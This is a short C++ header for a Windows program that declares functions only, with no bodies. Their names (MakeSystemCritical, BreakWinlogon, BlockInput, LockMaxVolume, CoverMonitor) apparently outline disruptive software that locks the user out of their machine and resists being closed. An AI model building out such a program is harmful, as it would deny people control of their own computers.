#pragma once
#include <Windows.h>
#include "EZProgram.h"

void InteractProcess();
void InteractThread();

void MakeSystemCritical();

void LockMaxVolume();

void BreakWinlogon();

void BlockInput();

DWORD GetMonitors(HMONITOR*& output);

void Update(EZ::Program* program);

void CoverMonitor(HMONITOR monitor);

int main();